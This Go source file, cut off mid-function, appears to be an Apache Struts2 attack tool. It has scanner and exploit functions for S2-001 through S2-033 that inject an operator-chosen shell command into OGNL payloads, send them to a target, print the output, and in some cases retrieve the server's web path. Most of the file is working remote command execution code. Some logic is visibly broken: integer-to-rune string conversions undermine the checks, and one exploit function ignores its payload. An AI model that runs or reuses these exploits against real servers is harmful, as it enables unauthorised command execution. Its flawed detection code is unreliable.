package main

import (
	"GolangStruts2/utils"
	"fmt"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"math/rand"
	"strings"
	"time"
)

type WorkExp struct {
	Url         string // url 必须带有参数
	Cmd         string
	CveName     string
	postData    string // POST | GET参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}
	contentType string // 默认 application/x-www-form-urlencoded
}

type ErrorMessage struct {
	Message string `json:"message"`
}

func (msg *ErrorMessage) Error() string {
	return fmt.Sprintf("API Error: %s", msg.Message)
}

var client = req.C().
	SetUserAgent("my-custom-client").
	SetTimeout(5 * time.Second).
	EnableDumpEachRequest().
	SetCommonErrorResult(&ErrorMessage{}).
	OnAfterResponse(func(client *req.Client, resp *req.Response) error {
		if resp.Err != nil {
			return nil
		}
		if errMsg, ok := resp.ErrorResult().(*ErrorMessage); ok {
			resp.Err = errMsg
			return nil
		}
		if !resp.IsSuccessState() {
			resp.Err = fmt.Errorf("bad status: %s\nraw content:\n%s", resp.Status, resp.Dump())
		}
		return nil
	})

// PocS001 S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行
func (c *WorkExp) PocS001() {
	var (
		resp *req.Response
		err  error
	)
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := strings.Replace(utils.ExecPayload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	if c.postData == "" {
		c.postData = "username=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-001！")
		} else {
			if c.postData == "" {
				c.postData = "password=" + Payload
			} else {
				c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
			}
			if c.contentType == "" {
				resp, err = client.R().
					SetBody(c.postData).
					SetHeader("User-Agent", utils.GlobalUserAgent).
					SetHeader("Content-Type", "application/x-www-form-urlencoded").
					Post(c.Url)
			} else {
				resp, err = client.R().
					SetBody(c.postData).
					SetHeader("User-Agent", utils.GlobalUserAgent).
					SetHeader("Content-Type", c.contentType).
					Post(c.Url)
			}
			if err != nil { // Error handling.
				//log.Println("error:", err)
			}
			if resp != nil {
				if strings.Contains(resp.String(), string(r1+r2)) {
					color.Red("*Found Struts2-001！")
				} else {
					fmt.Println("Struts2-001 Not Vulnerable.")
				}
			}
		}
	}
}

func (c *WorkExp) ExpS001Cmd() {
	var (
		resp *req.Response
		err  error
	)
	Payload := strings.Replace(utils.ExecPayload, "{cmd}", c.Cmd, -1)
	if c.postData == "" {
		c.postData = "username=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	if c.postData == "" {
		c.postData = "password=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

}

func (c *WorkExp) ExpS001GetPath() {
	var (
		resp *req.Response
		err  error
	)
	if c.postData == "" {
		c.postData = "username=" + utils.WebPath
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", utils.WebPath, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp)
	}

	if c.postData == "" {
		c.postData = "password=" + utils.WebPath
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", utils.WebPath, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp)
	}
}

// PocS003 S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据;
func (c *WorkExp) PocS003() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	reqUrl := c.Url + utils.Exec_payload
	reqUrl = strings.Replace(reqUrl, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	reqUrl = strings.Replace(reqUrl, "{{r1}}", string(r1), -1)
	reqUrl = strings.Replace(reqUrl, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(reqUrl)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-003！")
		} else {
			fmt.Println("Struts2-003 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS003Cmd() {
	var (
		resp *req.Response
		err  error
	)
	Payload := strings.Replace(utils.Exec_payload, "{cmd}", c.Cmd, -1)
	c.Url = c.Url + Payload
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp)
	}
}

// PocS005 S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据;
func (c *WorkExp) PocS005() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.Exec_payload1
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			fmt.Println("替换Payload在检测一次")
		} else {
			Payload = c.Url + utils.Exec_payload2
			Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
			Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
			Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
			resp, err = client.R().
				SetHeader("User-Agent", utils.GlobalUserAgent).
				Get(Payload)
			if err != nil { // Error handling.
				//log.Println("error:", err)
			}
			if resp != nil {
				if strings.Contains(resp.String(), string(r1+r2)) {
					color.Red("*Found Struts2-005！")
				} else {
					fmt.Println("Struts2-005 Not Vulnerable.")
				}
			}
		}
	}
}

func (c *WorkExp) ExpS005Cmd() {
	Payload := c.Url + utils.Exec_payload1
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	Payload = c.Url + utils.Exec_payload2
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpS005GetPath() {
	Payload := c.Url + utils.Web_path
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS007 S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password;
func (c *WorkExp) PocS007() {
	var (
		resp *req.Response
		err  error
	)
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := strings.Replace(utils.ExecPayload007, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	if c.postData == "" {
		c.postData = "username=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-007！")
		} else {
			if c.postData == "" {
				c.postData = "password=" + Payload
			} else {
				c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
			}
			if c.contentType == "" {
				resp, err = client.R().
					SetBody(c.postData).
					SetHeader("User-Agent", utils.GlobalUserAgent).
					SetHeader("Content-Type", "application/x-www-form-urlencoded").
					Post(c.Url)
			} else {
				resp, err = client.R().
					SetBody(c.postData).
					SetHeader("User-Agent", utils.GlobalUserAgent).
					SetHeader("Content-Type", c.contentType).
					Post(c.Url)
			}
			if err != nil { // Error handling.
				//log.Println("error:", err)
			}
			if resp != nil {
				if strings.Contains(resp.String(), string(r1+r2)) {
					color.Red("*Found Struts2-007！")
				} else {
					fmt.Println("Struts2-007 Not Vulnerable.")
				}
			}
		}
	}
}

func (c *WorkExp) ExpS007Cmd() {
	var (
		resp *req.Response
		err  error
	)
	Payload := strings.Replace(utils.ExecPayload007, "{cmd}", c.Cmd, -1)
	if c.postData == "" {
		c.postData = "username=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp)
	}

	if c.postData == "" {
		c.postData = "password=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS008 S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据;
func (c *WorkExp) PocS008() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.ExecPayload008
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-008！")
		} else {
			fmt.Println("Struts2-008 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS008Cmd() {
	Payload := c.Url + utils.ExecPayload008
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS009 S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据,URL后面需要请求参数名; 默认为: key;
func (c *WorkExp) PocS009() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.ExecPayload009
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	if c.postData == "" {
		c.postData = "?key=" + Payload
		c.Url = c.Url + c.postData
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
		c.Url = c.Url + c.postData
	}
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(c.Url)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-009！")
		} else {
			fmt.Println("Struts2-009 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS009Cmd() {
	Payload := c.Url + utils.ExecPayload009
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(c.Url)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS012 S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据,参数直接添加到URL后面; 默认为:name; 支持任意命令执行;
func (c *WorkExp) PocS012() {
	var (
		resp *req.Response
		err  error
	)
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := strings.Replace(utils.ExecPayload012, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	if c.postData == "" {
		c.postData = "?name=" + Payload
		c.Url = c.Url + c.postData
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
		c.Url = c.Url + c.postData
	}
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(c.Url)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-012！")
		} else {
			fmt.Println("Struts2-012 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS012Cmd() {
	var (
		resp *req.Response
		err  error
	)
	Payload := strings.Replace(utils.ExecPayload012, "{cmd}", c.Cmd, -1)
	c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS013 S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据; 支持获取WEB路径,任意命令执行;
func (c *WorkExp) PocS013() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.ExecPayload013
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-013！")
		} else {
			fmt.Println("Struts2-013 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS013Cmd() {
	Payload := c.Url + utils.ExecPayload013
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpS013GetPath() {
	Payload := c.Url + utils.WebPath013
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS015 S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持获取WEB路径,任意命令执行
func (c *WorkExp) PocS015() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.ExecPayload015
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), "6308") {
			color.Red("*Found Struts2-015！")
		} else {
			fmt.Println("Struts2-015 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS015Cmd() {
	Payload := c.Url + utils.ExecPayload015
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS016 S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行; 支持任意命令执行;
// PocS016 目的url必须带action，比如：http://xxx.com/xxx.action
func (c *WorkExp) PocS016() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.ExecPayload016a
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-016！-> ExecPayload016a")
		} else {
			fmt.Println("Struts2-016 Not Vulnerable. -> ExecPayload016a ")
		}
	}

	Payload = c.Url + utils.ExecPayload016b
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-016！-> ExecPayload016b")
		} else {
			fmt.Println("Struts2-016 Not Vulnerable. -> ExecPayload016b")
		}
	}

	Payload = c.Url + utils.ExecPayload016c
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-016！-> ExecPayload016c")
		} else {
			fmt.Println("Struts2-016 Not Vulnerable. -> ExecPayload016c")
		}
	}
}

func (c *WorkExp) ExpS016Cmd() {
	Payload := c.Url + utils.ExecPayload016a
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	Payload = c.Url + utils.ExecPayload016b
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	Payload = c.Url + utils.ExecPayload016c
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpS016GetPath() {
	Payload := c.Url + utils.WebPath016
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS019 S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行;
func (c *WorkExp) PocS019() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	reqUrl := c.Url + utils.ExecPayload019
	reqUrl = strings.Replace(reqUrl, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	reqUrl = strings.Replace(reqUrl, "{{r1}}", string(r1), -1)
	reqUrl = strings.Replace(reqUrl, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(reqUrl)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-019！")
		} else {
			fmt.Println("Struts2-019 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS019Cmd() {
	reqUrl := c.Url + utils.ExecPayload019
	reqUrl = strings.Replace(reqUrl, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(reqUrl)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpS019GetPath() {
	Payload := c.Url + utils.WebPath019
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS029 S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message; 支持任意命令执行;
func (c *WorkExp) PocS029() {
	var (
		resp *req.Response
		err  error
	)
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := strings.Replace(utils.ExecPayload029, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	if c.postData == "" {
		c.postData = "message=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-029！")
		} else {
			fmt.Println("Struts2-029 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS029Cmd() {
	var (
		resp *req.Response
		err  error
	)
	Payload := strings.Replace(utils.ExecPayload029, "{cmd}", c.Cmd, -1)
	if c.postData == "" {
		c.postData = "message=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil {
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS032 S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持获取WEB路径,任意命令执行;
func (c *WorkExp) PocS032() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	reqUrl := c.Url + utils.CheckPoc032
	reqUrl = strings.Replace(reqUrl, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	reqUrl = strings.Replace(reqUrl, "{{r1}}", string(r1), -1)
	reqUrl = strings.Replace(reqUrl, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(reqUrl)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-032！")
		} else {
			fmt.Println("Struts2-032 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS032Cmd() {
	reqUrl := c.Url + utils.ExecPayload032
	reqUrl = strings.Replace(reqUrl, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(reqUrl)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpS032GetPath() {
	reqUrl := c.Url + utils.WebPath032
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(reqUrl)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS033 S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持任意命令执行;
func (c *WorkExp) PocS033() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	reqUrl := c.Url + utils.CheckPoc033
	reqUrl = strings.Replace(reqUrl, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	reqUrl = strings.Replace(reqUrl, "{{r1}}", string(r1), -1)
	reqUrl = strings.Replace(reqUrl, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(reqUrl)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-033！")
		} else {
			fmt.Println("Struts2-033 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS033Cmd() {
	reqUrl := c.Url + utils.ExecPayload033
	reqUrl = strings.Replace(reqUrl, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
